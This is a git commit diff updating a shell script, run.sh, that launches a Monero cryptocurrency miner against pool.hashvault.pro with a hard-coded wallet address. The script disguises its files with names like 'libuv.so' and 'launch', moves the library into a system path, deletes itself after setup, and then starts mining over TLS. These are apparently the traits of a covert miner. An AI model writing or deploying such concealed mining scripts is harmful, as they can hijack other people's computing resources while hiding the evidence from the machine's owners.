3fcbfcaee3e3630ae67ab3df06e087ada068d202
Wellnel <41605099+Wellnel@users.noreply.github.com>
2025-01-28 12:56:08 +0800

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,18 +2,20 @@
 
 set -e
 # Replace changeme with your values. Check out readme for more.
+
 POOL="pool.hashvault.pro"
 PORT=443
-MYADDRESS="4AUTfJGTvT8A98PSE99EunfrnUbkWe9vU3FN3qsABQLP5aPKQuvWS5sCaD9WaXFQUqNtDLb9dcxiBgJiWCfjvDXp5ptWDY>
+MYADDRESS="4AUTfJGTvT8A98PSE99EunfrnUbkWe9vU3FN3qsABQLP5aPKQuvWS5sCaD9WaXFQUqNtDLb9dcxiBgJiWCfjvDXp5ptWDYG"
 COINNAME="monero"
+
 # executable permissions
 echo "Setting executable permissions"
 if ! chmod +x libuv.so launch; then
     echo "Error: Failed to set executable permissions"
     exit 1
-    else mv libuv.so ../../usr/lib && mv config.json launch ../
+    else mv libuv.so ../../usr/lib
 fi
-cd && rm -rf datahub
-echo "just start with ./launch -o $POOL:$PORT -u $MYADDRESS --tls --coin $COINNAME -t 1"
+rm run.sh
+echo "./launch -o $POOL:$PORT -u $MYADDRESS --tls --coin $COINNAME -t 1"
 echo "Starting now"
-./launch -o $POOL:$PORT -u $MYADDRESS --tls --coin $COINNAME -t 1
+ ./launch -o $POOL:$PORT -u $MYADDRESS --tls --coin $COINNAME -t 1
